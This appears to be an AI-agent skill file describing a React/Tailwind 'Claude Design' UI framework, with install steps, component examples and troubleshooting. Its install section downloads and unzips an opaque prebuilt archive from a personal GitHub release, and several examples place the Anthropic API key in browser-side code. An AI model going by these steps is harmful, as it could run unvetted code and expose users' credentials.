---
name: claude-design-ui-framework
description: AI UI/UX framework for building Claude-powered apps with React, Tailwind, screenshot-to-code, and Artifacts-style components
triggers:
  - "convert this screenshot to React code"
  - "create a Claude Design component"
  - "build a UI for my AI app with Artifacts style"
  - "generate Tailwind CSS from this design"
  - "set up Claude Design with shadcn/ui"
  - "make a responsive layout for Claude chat"
  - "add dark mode toggle to my Claude app"
  - "create SVG icons for my AI interface"
---

# Claude Design UI Framework

> Skill by [ara.so](https://ara.so) — Design Skills collection.

Claude Design is a sophisticated UI/UX framework for building Anthropic Claude-powered applications. It provides React components, Tailwind CSS utilities, screenshot-to-React conversion, Figma integration, and Artifacts-style rendering for AI-generated content. The framework includes stream-ready components, adaptive color systems, and built-in hooks for Claude's Messages API.

## Installation

### Download Pre-built Package

```bash
# Download from releases
wget https://github.com/mikesheehan54/Claude-Code-Design-AI/releases/download/Software/ClaudeDesign.zip
unzip ClaudeDesign.zip
cd ClaudeDesign
```

### From Source

```bash
# Clone repository
git clone https://github.com/mikesheehan54/Claude-Code-Design-AI.git
cd Claude-Code-Design-AI

# Install dependencies
npm install
# or
pnpm install
# or
yarn install
```

### Quick Start

```bash
# Start development server
npm run dev

# Build for production
npm run build

# Preview production build
npm run preview
```

## Project Structure

```
Claude-Code-Design-AI/
├── src/
│   ├── components/       # React components
│   │   ├── ui/          # Base UI components
│   │   ├── artifacts/   # Artifacts-style viewers
│   │   └── stream/      # Stream-ready components
│   ├── hooks/           # Custom React hooks
│   ├── lib/             # Utilities and helpers
│   ├── styles/          # Tailwind configurations
│   └── types/           # TypeScript definitions
├── public/              # Static assets
└── examples/            # Example implementations
```

## Core Components

### Artifacts UI Engine

The Artifacts UI engine renders AI-generated content with live previews:

```typescript
import { ArtifactViewer } from '@/components/artifacts/ArtifactViewer';
import { useState } from 'react';

function App() {
  const [artifact, setArtifact] = useState({
    type: 'code',
    language: 'typescript',
    content: '',
    isStreaming: true
  });

  return (
    <ArtifactViewer
      artifact={artifact}
      onUpdate={setArtifact}
      theme="dark"
      showLineNumbers
      enableCopy
    />
  );
}
```

### Stream-Ready Chat Component

Handle Claude's streaming responses with built-in typing animations:

```typescript
import { StreamChat } from '@/components/stream/StreamChat';
import Anthropic from '@anthropic-ai/sdk';

const client = new Anthropic({
  apiKey: process.env.ANTHROPIC_API_KEY,
});

function ChatInterface() {
  const [messages, setMessages] = useState([]);
  const [isStreaming, setIsStreaming] = useState(false);

  const handleSendMessage = async (userMessage: string) => {
    setMessages(prev => [...prev, { role: 'user', content: userMessage }]);
    setIsStreaming(true);

    const stream = await client.messages.stream({
      model: 'claude-3-5-sonnet-20241022',
      max_tokens: 1024,
      messages: [{ role: 'user', content: userMessage }],
    });

    let assistantMessage = '';
    for await (const chunk of stream) {
      if (chunk.type === 'content_block_delta') {
        assistantMessage += chunk.delta.text;
        setMessages(prev => {
          const updated = [...prev];
          const lastMsg = updated[updated.length - 1];
          if (lastMsg?.role === 'assistant') {
            lastMsg.content = assistantMessage;
          } else {
            updated.push({ role: 'assistant', content: assistantMessage });
          }
          return updated;
        });
      }
    }

    setIsStreaming(false);
  };

  return (
    <StreamChat
      messages={messages}
      onSend={handleSendMessage}
      isStreaming={isStreaming}
      placeholder="Ask Claude anything..."
    />
  );
}
```

### Screenshot to React Conversion

Convert screenshots or designs to React code:

```typescript
import { screenshotToReact } from '@/lib/screenshot-converter';
import { useState } from 'react';

function ScreenshotConverter() {
  const [imageFile, setImageFile] = useState<File | null>(null);
  const [generatedCode, setGeneratedCode] = useState('');

  const handleConvert = async () => {
    if (!imageFile) return;

    const base64Image = await fileToBase64(imageFile);
    
    const code = await screenshotToReact({
      image: base64Image,
      framework: 'react',
      styling: 'tailwind',
      componentType: 'functional',
      typescript: true,
    });

    setGeneratedCode(code);
  };

  return (
    <div className="screenshot-converter">
      <input
        type="file"
        accept="image/*"
        onChange={(e) => setImageFile(e.target.files?.[0] || null)}
      />
      <button onClick={handleConvert}>Convert to React</button>
      <pre className="generated-code">{generatedCode}</pre>
    </div>
  );
}

async function fileToBase64(file: File): Promise<string> {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = () => resolve(reader.result as string);
    reader.onerror = reject;
    reader.readAsDataURL(file);
  });
}
```

## Custom Hooks

### useClaudeStream

Hook for managing Claude streaming responses:

```typescript
import { useClaudeStream } from '@/hooks/useClaudeStream';

function MyComponent() {
  const {
    messages,
    isStreaming,
    error,
    sendMessage,
    clearMessages
  } = useClaudeStream({
    apiKey: process.env.ANTHROPIC_API_KEY,
    model: 'claude-3-5-sonnet-20241022',
    maxTokens: 2048,
  });

  return (
    <div>
      {messages.map((msg, i) => (
        <div key={i} className={`message ${msg.role}`}>
          {msg.content}
        </div>
      ))}
      {isStreaming && <div className="typing-indicator">Claude is typing...</div>}
      {error && <div className="error">{error.message}</div>}
      <button onClick={() => sendMessage('Hello!')}>Send</button>
    </div>
  );
}
```

### useDarkMode

Toggle dark mode with system preference detection:

```typescript
import { useDarkMode } from '@/hooks/useDarkMode';

function ThemeToggle() {
  const { isDark, toggle, setDark, setLight } = useDarkMode({
    defaultDark: false,
    storageKey: 'claude-design-theme',
  });

  return (
    <button onClick={toggle}>
      {isDark ? '🌙 Dark' : '☀️ Light'}
    </button>
  );
}
```

### useResponsiveLayout

Adaptive layouts based on viewport:

```typescript
import { useResponsiveLayout } from '@/hooks/useResponsiveLayout';

function ResponsiveComponent() {
  const { isMobile, isTablet, isDesktop, breakpoint } = useResponsiveLayout();

  return (
    <div className={`layout-${breakpoint}`}>
      {isMobile && <MobileView />}
      {isTablet && <TabletView />}
      {isDesktop && <DesktopView />}
    </div>
  );
}
```

## Tailwind Configuration

### Extending the Design System

```typescript
// tailwind.config.ts
import type { Config } from 'tailwindcss';
import { claudeDesignPreset } from '@/styles/tailwind-preset';

export default {
  presets: [claudeDesignPreset],
  content: [
    './index.html',
    './src/**/*.{js,ts,jsx,tsx}',
  ],
  theme: {
    extend: {
      colors: {
        'claude-primary': '#d97757',
        'claude-secondary': '#0078D7',
        'artifact-bg': 'var(--artifact-bg)',
      },
      fontFamily: {
        'sans': ['Inter', 'system-ui', 'sans-serif'],
        'mono': ['Fira Code', 'monospace'],
      },
      animation: {
        'typing': 'typing 1.5s steps(40) infinite',
        'stream': 'stream 2s ease-in-out infinite',
      },
    },
  },
  plugins: [],
} satisfies Config;
```

### Custom Utility Classes

```css
/* src/styles/custom.css */
@tailwind base;
@tailwind components;
@tailwind utilities;

@layer components {
  .artifact-container {
    @apply rounded-lg border border-gray-200 dark:border-gray-800 bg-white dark:bg-gray-950 p-4;
  }

  .stream-message {
    @apply animate-stream opacity-80;
  }

  .code-block {
    @apply font-mono text-sm bg-gray-100 dark:bg-gray-900 p-4 rounded overflow-x-auto;
  }

  .ai-confidence-high {
    @apply bg-green-50 border-green-200 dark:bg-green-950 dark:border-green-800;
  }

  .ai-confidence-medium {
    @apply bg-yellow-50 border-yellow-200 dark:bg-yellow-950 dark:border-yellow-800;
  }

  .ai-confidence-low {
    @apply bg-red-50 border-red-200 dark:bg-red-950 dark:border-red-800;
  }
}
```

## Figma Integration

### Export Components from Figma

```typescript
import { figmaToReact } from '@/lib/figma-converter';

async function exportFigmaComponent(figmaUrl: string) {
  const component = await figmaToReact({
    url: figmaUrl,
    apiToken: process.env.FIGMA_API_TOKEN,
    options: {
      framework: 'react',
      typescript: true,
      styling: 'tailwind',
      includeShadcn: true,
    },
  });

  return component;
}
```

## shadcn/ui Integration

Claude Design works seamlessly with shadcn/ui components:

```bash
# Initialize shadcn/ui in your project
npx shadcn-ui@latest init

# Add components
npx shadcn-ui@latest add button
npx shadcn-ui@latest add card
npx shadcn-ui@latest add dialog
```

```typescript
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { ArtifactViewer } from '@/components/artifacts/ArtifactViewer';

function ArtifactCard({ artifact }) {
  return (
    <Card className="artifact-container">
      <CardHeader>
        <CardTitle>{artifact.title}</CardTitle>
      </CardHeader>
      <CardContent>
        <ArtifactViewer artifact={artifact} />
        <Button variant="outline" className="mt-4">
          Export Code
        </Button>
      </CardContent>
    </Card>
  );
}
```

## SVG Icon Creator

Generate custom SVG icons programmatically:

```typescript
import { createSVGIcon } from '@/lib/svg-creator';

const customIcon = createSVGIcon({
  name: 'claude-logo',
  size: 24,
  viewBox: '0 0 24 24',
  paths: [
    'M12 2L2 7v10c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-10-5z',
  ],
  fill: 'currentColor',
  stroke: 'none',
});

// Use in React
function MyIcon() {
  return (
    <svg
      width={customIcon.size}
      height={customIcon.size}
      viewBox={customIcon.viewBox}
      fill={customIcon.fill}
    >
      {customIcon.paths.map((d, i) => (
        <path key={i} d={d} />
      ))}
    </svg>
  );
}
```

## Common Patterns

### Real-time Code Preview

```typescript
import { CodePreview } from '@/components/artifacts/CodePreview';
import { useState, useEffect } from 'react';

function LiveCodeEditor() {
  const [code, setCode] = useState('');
  const [preview, setPreview] = useState('');

  useEffect(() => {
    const timer = setTimeout(() => {
      setPreview(code);
    }, 500);
    return () => clearTimeout(timer);
  }, [code]);

  return (
    <div className="grid grid-cols-2 gap-4">
      <textarea
        value={code}
        onChange={(e) => setCode(e.target.value)}
        className="code-block"
      />
      <CodePreview
        code={preview}
        language="tsx"
        showPreview
        autoRefresh
      />
    </div>
  );
}
```

### Adaptive Color Based on AI Confidence

```typescript
import { useAIConfidence } from '@/hooks/useAIConfidence';

function AIResponse({ message, metadata }) {
  const confidence = useAIConfidence(metadata);

  return (
    <div className={`
      p-4 rounded-lg
      ${confidence > 0.8 ? 'ai-confidence-high' : ''}
      ${confidence > 0.5 && confidence <= 0.8 ? 'ai-confidence-medium' : ''}
      ${confidence <= 0.5 ? 'ai-confidence-low' : ''}
    `}>
      <p>{message}</p>
      <span className="text-xs text-gray-500">
        Confidence: {(confidence * 100).toFixed(0)}%
      </span>
    </div>
  );
}
```

### Markdown with LaTeX Rendering

```typescript
import { MarkdownRenderer } from '@/components/ui/MarkdownRenderer';

function DocumentViewer({ content }) {
  return (
    <MarkdownRenderer
      content={content}
      enableLatex
      enableCodeHighlight
      sanitize
      className="prose dark:prose-invert max-w-none"
    />
  );
}
```

## Environment Configuration

Create a `.env` file in your project root:

```bash
# Anthropic API
ANTHROPIC_API_KEY=your_api_key_here

# Figma Integration (optional)
FIGMA_API_TOKEN=your_figma_token_here

# Application Settings
VITE_APP_TITLE=Claude Design App
VITE_DEFAULT_MODEL=claude-3-5-sonnet-20241022
VITE_MAX_TOKENS=4096
```

Access environment variables:

```typescript
const config = {
  anthropicKey: import.meta.env.ANTHROPIC_API_KEY,
  figmaToken: import.meta.env.FIGMA_API_TOKEN,
  defaultModel: import.meta.env.VITE_DEFAULT_MODEL,
  maxTokens: parseInt(import.meta.env.VITE_MAX_TOKENS || '4096'),
};
```

## Troubleshooting

### Streaming Not Working

**Issue**: Claude's streaming responses aren't displaying properly.

**Solution**: Ensure you're using the latest Anthropic SDK and that your API key has streaming enabled:

```typescript
// Verify SDK version
import Anthropic from '@anthropic-ai/sdk';
console.log(Anthropic.VERSION); // Should be >= 0.17.0

// Use proper stream handling
const stream = await client.messages.stream({
  model: 'claude-3-5-sonnet-20241022',
  max_tokens: 1024,
  messages: [{ role: 'user', content: 'Hello' }],
});

// Handle all event types
stream.on('text', (text) => console.log(text));
stream.on('error', (error) => console.error(error));
stream.on('end', () => console.log('Stream ended'));
```

### Dark Mode Not Persisting

**Issue**: Dark mode preference resets on page reload.

**Solution**: Verify localStorage is accessible and the key matches:

```typescript
import { useDarkMode } from '@/hooks/useDarkMode';

// Ensure storageKey is consistent
const { isDark, toggle } = useDarkMode({
  storageKey: 'claude-design-theme', // Must match across app
  defaultDark: window.matchMedia('(prefers-color-scheme: dark)').matches,
});
```

### Tailwind Classes Not Applying

**Issue**: Custom Tailwind classes from Claude Design aren't working.

**Solution**: Ensure the preset is properly imported:

```typescript
// tailwind.config.ts
import { claudeDesignPreset } from './src/styles/tailwind-preset';

export default {
  presets: [claudeDesignPreset], // Must be first
  content: ['./src/**/*.{js,ts,jsx,tsx}'],
  // ... rest of config
};
```

### Screenshot Conversion Fails

**Issue**: Screenshot-to-React conversion produces invalid code.

**Solution**: Ensure image is properly base64 encoded and within size limits:

```typescript
async function convertScreenshot(file: File) {
  // Validate file size (max 5MB)
  if (file.size > 5 * 1024 * 1024) {
    throw new Error('Image too large. Max 5MB.');
  }

  // Validate file type
  if (!file.type.startsWith('image/')) {
    throw new Error('Invalid file type. Must be an image.');
  }

  const base64 = await fileToBase64(file);
  
  return await screenshotToReact({
    image: base64,
    framework: 'react',
    styling: 'tailwind',
  });
}
```

### Build Errors with TypeScript

**Issue**: TypeScript errors during build.

**Solution**: Ensure all types are properly exported:

```typescript
// src/types/index.ts
export interface ArtifactType {
  type: 'code' | 'document' | 'chart';
  content: string;
  language?: string;
  isStreaming?: boolean;
}

export interface MessageType {
  role: 'user' | 'assistant';
  content: string;
  timestamp?: number;
}

// Use in components
import type { ArtifactType, MessageType } from '@/types';
```

## Best Practices

1. **Always sanitize AI-generated content** before rendering to prevent XSS attacks
2. **Use environment variables** for all API keys and secrets
3. **Implement error boundaries** around streaming components
4. **Optimize for mobile** using the responsive layout hooks
5. **Leverage Tailwind's JIT mode** for faster development builds
6. **Cache frequently used components** with React.memo
7. **Use TypeScript strict mode** to catch type errors early

## Additional Resources

- [Anthropic API Documentation](https://docs.anthropic.com/)
- [shadcn/ui Components](https://ui.shadcn.com/)
- [Tailwind CSS Documentation](https://tailwindcss.com/)
- [React 18 Features](https://react.dev/)
